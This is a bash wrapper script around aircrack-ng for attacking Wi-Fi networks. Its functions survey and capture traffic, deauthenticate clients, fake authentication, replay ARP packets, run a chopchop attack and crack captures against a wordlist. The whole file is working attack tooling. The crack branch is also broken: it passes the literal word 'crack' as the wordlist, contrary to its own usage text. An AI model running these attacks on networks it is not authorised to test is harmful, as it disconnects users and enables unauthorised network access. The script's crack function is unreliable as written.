#!/usr/bin/env bash
# Author: Ibrahim Mkusa
# About: Higher interface to aircrack tools

set -e

usage () {
  echo "(survey) air.sh [interface] [function]"
  echo "(watch) air.sh [interface] [function] [bssid] [channel] [output_file]"
  echo "(deauth) air.sh [interface] [function] [count] [bssid] [client]"
  echo "(fakeauth) air.sh [interface] [function] [delay] [bmac] [hmac]"
  echo "(arpreplay) air.sh [interface] [function] [bmac] [hmac]"
  echo "(chopchop) air.sh [interface] [function] [bmac] [hmac] "
  echo "(crack) air.sh [capfile] [wordlist]"
}

if [[ "$2" == "survey" ]];then
  # Listen to everything
  sudo airodump-ng "$1" --band abg
elif [[ "$2" == "watch" ]];then
  # channel might be redundant if card locked to channel
  echo "Watching $3 on channel $4 writing to $5"
  sudo airodump-ng "$1" --bssid "$3" -c "$4" -w "$5"
elif [[ "$2" == "deauth" ]];then
  if [[ $# -eq 4 ]];then
    sudo aireplay-ng "$1" --deauth "$3" -a "$4"
  else
    sudo aireplay-ng "$1" --deauth "$3" -a "$4" -c "$5"
  fi
elif [[ "$2" == "fakeauth" ]];then
  echo "Don't proceed until authentication is successful"
  sudo aireplay-ng "$1" -1 "$3" -b "$4" -h "$5"
elif [[ "$2" == "arpreplay" ]]; then
  echo "Capturing arp replays and reinjecting"
  sudo aireplay-ng "$1" -3 -b "$3" -h "$4"
elif [[ "$2" == "chopchop" ]];then
  sudo aireplay-ng "$1" -4 -b "$3" -h"$4"
  echo "Done .. use xor file to make arp replay"
  echo "Follow directions here https://www.aircrack-ng.org/doku.php?id=korek_chopchop"
elif [[ "$2" == "crack" ]];then
  sudo aircrack-ng "$1" -w "$2"
else
  usage
fi
